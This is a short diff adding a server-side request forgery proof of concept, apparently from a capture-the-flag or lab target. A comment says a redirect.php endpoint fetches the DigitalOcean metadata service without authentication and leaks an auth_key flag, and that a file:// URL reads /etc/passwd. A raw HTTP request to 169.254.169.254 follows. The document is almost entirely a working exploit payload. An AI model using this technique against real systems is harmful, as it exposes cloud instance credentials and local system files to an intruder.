@@ -1,0 +1,4 @@
+# SSRF to DigitalOcean IMDS. Extracts auth_key = flag{f51ac5e4-d98a-fc61-e3bd-8fbba0423109}. No authentication required. file:// also works: redirect.php?url=file:///etc/passwd
+
+GET /redirect.php?url=http://169.254.169.254/metadata/v1.json HTTP/1.1
+Host: 172.17.0.1:57991
